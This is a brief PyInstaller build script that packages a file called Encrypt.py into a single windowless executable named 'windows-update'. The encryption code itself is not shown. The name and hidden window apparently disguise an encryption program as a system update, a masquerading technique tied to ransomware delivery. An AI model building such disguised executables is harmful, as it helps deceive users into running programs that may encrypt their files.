import PyInstaller.__main__

entry_point = 'Encrypt.py'

output_file = 'windows-update'

PyInstaller.__main__.run([
    '--onefile',
    '--noconsole',
    '--name', output_file,
    entry_point
])
